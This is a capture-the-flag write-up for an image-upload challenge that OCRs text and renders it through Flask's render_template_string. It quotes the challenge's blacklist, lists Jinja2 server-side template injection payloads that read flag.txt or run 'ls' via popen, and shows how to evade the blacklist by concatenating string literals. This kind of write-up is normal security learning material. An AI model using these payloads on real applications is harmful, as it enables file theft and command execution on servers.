## Writeup:
You can upload an image file. This reads the text content in tne image using pytesseract and returns it.  
  
### Intended Solution:
Observe how the text content is returned:  
> return render\_template\_string(f'{content}')  

Clearly this is [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).
You can see various paylods [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)  
  
  
Also observe that various letters and words are blacklisted:  
>blacklist\_letters = '0123456789%|=+-#'  
blacklist\_words = ['join', 'class', 'globals', 'builtins', 'request', 'self', 'config', 'init']

Because of this blacklist, our payloads are rendered useless:
>Payloads:  
>* {{ ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[40]('./flag.txt').read() }}  
>* {{ get\_flashed\_messages.\_\_globals\_\_.\_\_builtins\_\_.open("./flag.txt").read() }}
>* {{ config['\_\_class\_\_']['\_\_init\_\_']['\_\_globals\_\_']['os'].popen('ls').read() }}

{ If 'request' was not blacklisted, one could easily bypass blacklist by passing extra parameters and using request.form, request.args or request.values }  

Hmm... Look at line No. 32, where random file names are generated:  
> file_name = 'Image''File_' + str(uuid.uuid4())  

If you play around a bit in python, you observe that 'a''b' concatinates to give 'ab'. (not in variable form) By passing `{{'a''b'}}` in the template, you get 'ab' as the output. We can use this to bypass the blacklist:
>#### {{ get\_flashed\_messages['\_\_glob''als\_\_']['\_\_builti''ns\_\_'].open("./flag.txt").read() }}

Note various other payloads can be used